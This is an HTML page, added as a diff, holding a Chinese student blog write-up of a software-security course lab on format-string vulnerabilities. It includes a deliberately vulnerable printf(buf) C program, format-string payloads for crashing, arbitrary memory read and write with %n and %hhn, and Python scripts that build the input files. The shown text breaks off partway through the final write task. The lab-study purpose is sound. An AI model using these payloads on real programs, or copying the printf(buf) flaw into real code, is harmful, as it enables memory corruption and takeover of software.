@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="《软件安全》课程实验3，格式化字符串实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="software-security-lab3">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/04/14/input_check_lab/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="《软件安全》课程实验3，格式化字符串实验">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421092738658.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220422195546290.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220422200734751.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421095025478.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421100429667.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421102435584.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421104922421.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421105447481.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421105854846.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421110303017.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421110454979.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421110856086.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421110907825.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220422231520364.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421123339345-16505156197111.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421123840114.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220423144754472.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220423151615031.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421131130079.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421131242295.png">
+<meta property="article:published_time" content="2022-04-14T00:27:47.000Z">
+<meta property="article:modified_time" content="2023-01-19T04:56:44.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="fmtstr">
+<meta property="article:tag" content="software-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220421092738658.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>software-security-lab3 | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-input_check_lab" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/14/input_check_lab/" class="article-date">
+      <time datetime="2022-04-14T00:27:47.000Z" itemprop="datePublished">2022-04-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      software-security-lab3
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/school/">school</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>《软件安全》课程实验3，格式化字符串实验</p>
+<span id="more"></span>
+
+<h1 id="input-check-lab"><a href="#input-check-lab" class="headerlink" title="input check lab"></a>input check lab</h1><h2 id="printf的实现"><a href="#printf的实现" class="headerlink" title="printf的实现"></a>printf的实现</h2><p>c语言中的参数个数不定函数。例如printf。实现方法如下。主要使用了va_list这个类型的数据结构。</p>
+<p><img src="/.io//image-20220421092738658.png" alt="image-20220421092738658"></p>
+<p>首先是va_list。这是一个数据结构，指向当前需要寻找的位置，每次指向下一个栈的高地址位置。每次取四个byte并且返回回来。这就实现了在栈上放置可以控制的数量的参数之后访问。</p>
+<h3 id="格式化字符串漏洞成因"><a href="#格式化字符串漏洞成因" class="headerlink" title="格式化字符串漏洞成因"></a>格式化字符串漏洞成因</h3><p>格式化字符串的成因就是：当用户可以控制printf的格式化字符串输入时，就可以借助printf提供的va_list对栈上数据的访问(以及修改效果)实现<strong>任意地址读写</strong>。下面举例说明。</p>
+<p>我们编写以下函数作为示例。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc ./test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们用gdb调试一下。在printf的地方下断点，如下图所示。</p>
+<p><img src="/.io//image-20220422195546290.png" alt="image-20220422195546290"></p>
+<p>可以看到当我们输入<code>%p.%p.%p.%p</code>时，这便作为了格式化字符串传入printf。于是，printf将根据%p的含义，<strong>依次从栈上提取出四个地址输出</strong>。在我们本次的输入中，printf就将会输出上涂红色箭头指向的内容。这就能实现栈上数据任意地址读。</p>
+<p>此外，还可以利用printf实现任意地址读。<strong>为了达成此目标，需要提前将要读的地址写入栈上，之后找到这个写入的地址在格式化字符串调用开始时所在的偏移位置。</strong></p>
+<p>上面这句话的含义，我们用下面的图展示出来。这是我们调用printf时的栈帧。</p>
+<p><img src="/.io//image-20220422200734751.png" alt="image-20220422200734751"></p>
+<p>我们的目的是<strong>打印我们能够控制的地址</strong>，但是我们可控的栈上数据(buf)可能在举例printf调用时栈很远的地方。这个地方能够储存一个我们可控的地址。</p>
+<p>在上图中，我用aaaa表示这个地址。<strong>假设说我们知道aaaa和上图中格式化字符串参数之间的偏移，我们就能够通过足够的%s来控制输出aaaa地址中的内容。</strong>(printf提供了一种printf(%n$s)的方法来让程序员控制读取栈上第几个数据，n代表位置)</p>
+<p>理解了上面的任意地址读，我们就很方便的可以实现任意地址写。主要思想还是类似的，<strong>由于我们能控制写的地址，我们可以使用printf提供的<code>%n</code>来往指定地址写入数据。</strong>好了，主要思想就是上面这些。接下来主要通过seed lab来做一下上面相关的实验。</p>
+<h2 id="task1-crash"><a href="#task1-crash" class="headerlink" title="task1 crash"></a>task1 crash</h2><p>让程序crash的方法有很多。对于格式化字符串，<strong>我们只需要构造参数使得格式化字符串打印一个不可访问地址的内容即可</strong>。</p>
+<p>我们构造的payload可以是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s.%s.%s.%s.%s.%s.%s.%s.%s</span><br></pre></td></tr></table></figure>
+
+<p>只需要把上述内容发过去，<code>printf</code>就会试图连续的以字符串格式解析栈上数据为字符串然后输出。由于%s会访问不可读的内存(栈上存在NULL，不可访问)，在成segegv，因此出现程序crash。</p>
+<p><img src="/.io//image-20220421095025478.png" alt="image-20220421095025478"></p>
+<h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><h3 id="partA"><a href="#partA" class="headerlink" title="partA"></a>partA</h3><p>这里让我们找到我们输入的参数被放在格式化字符串参数偏移什么地方的位置。也就是一开始对printf的介绍中的<code>aaaa</code>的位置。从下面这张图中可以找到对应位置。这个是第64位(黄色框框中的)。</p>
+<p><img src="/.io//image-20220421100429667.png" alt="image-20220421100429667"></p>
+<p>理解上面输出的含义：这表示printf的buffer和当前调用printf的时地址之差为64个地址长度。在x32下也就是(64*4)</p>
+<h3 id="partB"><a href="#partB" class="headerlink" title="partB"></a>partB</h3><p>这里让我们<strong>打印出一个特定地址的内存</strong>。所用的方法和partA类似，也是找到一个栈上数据和当前格式化字符串开始位置栈内容的偏移。</p>
+<p>使用以下payload即可。主要是<strong>使用%64$s打印第64个参数的位置的内容信息</strong>。我们先把我们要打印的地址放在我们payload的0到4位，然后用<code>%64$s</code>来打印从printf开始栈上第64位的内容。这里根据上面partA也就是一开始输入的number中储存的数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080b4008</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%64$s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下面是我们成功打印出来的内容。</p>
+<p><img src="/.io//image-20220421102435584.png" alt="image-20220421102435584"></p>
+<h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><p>这里要求我们改一个确定地方的内存。在part2中我们已经做到能够读取特定地方内容。这里使用%x$n可以实现对对应位置修改数据。具体来说,payload为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">10</span>c%<span class="number">67</span>$naaa（<span class="number">0x080e5068</span>）</span><br></pre></td></tr></table></figure>
+
+<p>对上面的内容做解释：注意到字符串<code>%10c%67$naaa</code>的长度是12，在32位下是3个地址长度。那么我们后面输入的想要修改的地址就是在栈上第67位(67=64+3)。<code>%10c</code>表示输出10个字符，默认是空格，<code>%67$n</code>表示<strong>以四字节的大小修改从当前格式化字符串buffer开始的位置开始偏移67位的地址</strong>。最后的三个aaa是为了补全到4字节对齐(因为后面要放地址)。</p>
+<p>因此，上面payload的含义是往<code>0x080e5068</code>写入10，写入单位是4字节。完整的payload如下所示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="number">12</span>:<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%10c%67$naaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>修改后的目标地址数值如下图所示。</p>
+<p><img src="/.io//image-20220421104922421.png" alt="image-20220421104922421"></p>
+<h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><p>这里要修改为5000。我们可以继续用上面的4字节写入，但是这样会导致一次写入5000byte数据，这对于网络传输而言是不友好的。因此我在这里尝试采用小字节写入。也就是<code>%x$hhn</code>。下面详细解释一下Payload。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>$n%<span class="number">80</span>c%<span class="number">69</span>$hhn(<span class="number">0x080e5068</span>)(<span class="number">0x080e5069</span>)</span><br></pre></td></tr></table></figure>
+
+<p>考虑到0x5000的16进制小端法表示为\x00\x50\x00\x00。其中0x080e5068需要储存\x00，0x080e5069需要储存\x50，0x080e506a和0x080e506b需要储存\x00。</p>
+<p>我们需要在<code>0x080e5068</code>位置以4byte为单位写上0，因此也就是前面一部分payload<code>%68$n</code>。之后的<code>%80c%69$hhn</code>表示在0x080e5069位置以单字节写入80，也就是16进制的0x50。完整的payload以及生成效果如下所示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="number">16</span>:<span class="number">20</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5069</span></span><br><span class="line">content[<span class="number">20</span>:<span class="number">24</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%68$n%80c%69$hhn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220421105447481.png" alt="image-20220421105447481"></p>
+<h3 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h3><p>和上面的原理基本类似。不过这里要写一个大的数字，并且没有\x00。那么我们就需要逐字节写入，防止一次性输入太多导致程序崩溃。</p>
+<p>我们的payload构造如下所示。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">170</span>c%<span class="number">76</span>$hhn%<span class="number">17</span>c%<span class="number">77</span>$hhn%<span class="number">17</span>c%<span class="number">78</span>$hhn%<span class="number">17</span>c%<span class="number">79</span>$hhnaaa(<span class="number">0x080e506b</span>)(<span class="number">0x080e506a</span>)(<span class="number">0x080e5069</span>)(<span class="number">0x080e5068</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先明确目标。我们要写入0xaabbccdd也就是<code>\xdd\xcc\xbb\xaa</code>。具体来说，0x080e506b需要写入\xaa，0x080e506a需要写入\xbb，0x080e5069需要写入\xcc，0x080e5068需要写入\xdd。下面解释一下payload。</p>
+<p>第一个<code>%170c%76$hhn</code>表示以单字节单位写入170到第76个参数(也就是<code>0x080e506b</code>)由于0xaa就是170,并且0xaa最小，因此我们优先写入。</p>
